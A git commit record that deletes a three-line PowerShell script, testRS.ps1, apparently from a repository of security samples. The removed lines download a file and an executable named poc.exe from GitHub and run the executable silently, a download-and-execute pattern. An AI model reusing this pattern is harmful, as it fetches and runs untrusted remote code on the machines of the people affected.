d5dbe27e23b223f8e18c276e6730ed20ded96990
squentel <30870132+squentel@users.noreply.github.com>
2022-09-14 17:03:50 +0200

    Delete testRS.ps1

--- testRS.ps1
+++
@@ -1,3 +0,0 @@
-Invoke-WebRequest 'https://raw.githubusercontent.com/squentel/mysamples/main/init2' -OutFile C:\data\init2
-Invoke-WebRequest 'https://github.com/squentel/mysamples/blob/main/poc.exe' -OutFile C:\data\PoC.exe
-Start-Process -Wait -FilePath ‘C:\data\PoC.exe’ -ArgumentList ‘/s’ -PassThru
